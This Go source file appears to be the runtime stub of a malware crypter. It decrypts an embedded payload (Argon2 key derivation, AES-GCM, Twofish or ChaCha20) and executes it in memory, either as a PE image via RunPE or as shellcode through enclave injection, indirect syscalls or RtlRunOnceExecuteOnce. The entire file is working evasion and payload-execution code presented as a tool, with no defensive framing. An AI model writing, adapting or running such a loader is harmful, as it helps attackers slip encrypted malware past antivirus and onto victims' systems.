package main

import (
	"bytes"
	"compress/zlib"
	"crypto/aes"
	"crypto/cipher"
	_ "embed"
	"flag"
	"fmt"
	"io"
	"runtime/debug"
	"strings"

	runpe "github.com/carved4/go-crypter/pkg/pe"
	shellcode "github.com/carved4/go-crypter/pkg/shellcode"

	"github.com/fxamacker/cbor/v2"
	"golang.org/x/crypto/argon2"
	"golang.org/x/crypto/chacha20poly1305"
	"golang.org/x/crypto/twofish"
)

//go:embed payload.cbor
var payloadData []byte

// ^^^ before payload.cbor exists this will be an error
const (
	argonTime    uint32 = 1
	argonMemory  uint32 = 64 * 1024
	argonThreads uint8  = 4
	argonKeyLen  uint32 = chacha20poly1305.KeySize
)

type PayloadData struct {
	EncryptedBytes []byte `cbor:"encrypted"`
	Password       []byte `cbor:"password"`
	Salt           []byte `cbor:"salt"`
	Nonce          []byte `cbor:"nonce"`
	Alg            string `cbor:"alg"`
	Compressed     bool   `cbor:"compressed,omitempty"` // Flag to indicate if data is compressed
	PayloadType    string `cbor:"payload_type"`         // "exe" or "shellcode"
	ArgonParams    struct {
		Time    uint32 `cbor:"time"`
		Memory  uint32 `cbor:"memory"`
		Threads uint8  `cbor:"threads"`
	} `cbor:"argon_params"`
}

func decryptFile() ([]byte, error) {
	var payload PayloadData
	if err := cbor.Unmarshal(payloadData, &payload); err != nil {
		return nil, fmt.Errorf("failed to unmarshal payload: %v", err)
	}

	timeParam := argonTime
	memoryParam := argonMemory
	threadsParam := argonThreads

	if payload.ArgonParams.Time > 0 {
		timeParam = payload.ArgonParams.Time
	}
	if payload.ArgonParams.Memory > 0 {
		memoryParam = payload.ArgonParams.Memory
	}
	if payload.ArgonParams.Threads > 0 {
		threadsParam = payload.ArgonParams.Threads
	}

	key := argon2.IDKey(payload.Password, payload.Salt,
		timeParam, memoryParam, threadsParam, argonKeyLen)

	var aead cipher.AEAD
	switch strings.ToLower(payload.Alg) {
	case "aesgcm", "aes":
		block, err := aes.NewCipher(key)
		if err != nil {
			return nil, fmt.Errorf("failed to create AES cipher: %v", err)
		}
		aead, err = cipher.NewGCM(block)
		if err != nil {
			return nil, fmt.Errorf("failed to create AES-GCM AEAD: %v", err)
		}
	case "twofish":
		block, err := twofish.NewCipher(key)
		if err != nil {
			return nil, fmt.Errorf("failed to create Twofish cipher: %v", err)
		}
		aead, err = cipher.NewGCM(block)
		if err != nil {
			return nil, fmt.Errorf("failed to create Twofish-GCM AEAD: %v", err)
		}
	default:
		var err error
		aead, err = chacha20poly1305.New(key)
		if err != nil {
			return nil, fmt.Errorf("failed to create ChaCha20 AEAD: %v", err)
		}
	}

	// Decrypt and verify the data
	decryptedBytes, err := aead.Open(nil, payload.Nonce, payload.EncryptedBytes, nil)
	if err != nil {
		return nil, err
	}

	if payload.Compressed {

		zr, err := zlib.NewReader(bytes.NewReader(decryptedBytes))
		if err != nil {
			return nil, fmt.Errorf("failed to create decompression reader: %v", err)
		}
		defer zr.Close()
		var decompressed bytes.Buffer
		_, err = io.Copy(&decompressed, zr)
		if err != nil {
			return nil, fmt.Errorf("failed to decompress data: %v", err)
		}

		decryptedBytes = decompressed.Bytes()
	}

	return decryptedBytes, nil
}

func main() {
	debug.SetGCPercent(-1)
	enclaveFlag := flag.Bool("enclave", false, "use enclave method")
	indirectFlag := flag.Bool("indirect", false, "use indirect syscall method")
	runOnceFlag := flag.Bool("once", false, "use ntdll!rtlrunonceexecuteonce method")
	flag.Parse()

	decryptedBytes, err := decryptFile()
	if err != nil {
		fmt.Println("[-] error decrypting file:", err)
		return
	}
	var payload PayloadData
	if err := cbor.Unmarshal(payloadData, &payload); err != nil {
		fmt.Println("[-] error unmarshaling payload for type check:", err)
		return
	}

	executionMethodCount := 0
	if *enclaveFlag {
		executionMethodCount++
	}
	if *indirectFlag {
		executionMethodCount++
	}
	if *runOnceFlag {
		executionMethodCount++
	}

	if executionMethodCount > 1 {
		fmt.Println("[-] error cannot use multiple shellcode execution methods simultaneously")
		return
	}

	switch strings.ToLower(payload.PayloadType) {
	case "exe":
		runpe.LoadPe(decryptedBytes)
	case "shellcode":
		if *enclaveFlag {
			err := shellcode.EnclaveInject(decryptedBytes)
			if err != nil {
				fmt.Println("enclave injection failed:", err)
			}
		} else if *indirectFlag {
			err := shellcode.IndirectSyscallInject(decryptedBytes)
			if err != nil {
				fmt.Println("indirect syscall injection failed:", err)
			}
		} else if *runOnceFlag {
			err := shellcode.RunOnce(decryptedBytes)
			if err != nil {
				fmt.Println("runonce injection failed:", err)
			}
		} else {
			fmt.Println("error: shellcode payload requires an execution method flag")
			fmt.Println("available flags: -enclave, -indirect, -once")
		}
	default:
		fmt.Println("unknown payload type:", payload.PayloadType)
		fmt.Println("supported types: exe, shellcode")
	}
}
